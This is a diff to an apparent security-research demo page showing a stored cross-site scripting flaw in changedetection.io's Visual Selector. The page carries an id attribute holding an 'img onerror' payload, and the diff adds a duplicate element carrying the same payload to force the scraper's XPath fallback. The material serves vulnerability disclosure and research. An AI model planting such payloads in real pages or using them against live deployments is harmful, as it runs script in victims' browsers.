@@ -5,6 +5,7 @@
 <h1>Security Research Reference Page</h1>
 <p>This page is used to demonstrate the changedetection.io CPM vulnerability (F1).</p>
 <div id='"><img src=x onerror=alert(document.domain)>'>Monitor this section for changes</div>
+<div id='"><img src=x onerror=alert(document.domain)>'>Duplicate ID — forces XPath fallback in scraper</div>
 <p>The element above contains a malicious <code>id</code> attribute. When changedetection.io
 scrapes this page via Playwright and stores the visual selector data, the id value is written
 unsanitized into <code>elements.deflate</code>. On hover over the Visual Selector canvas,
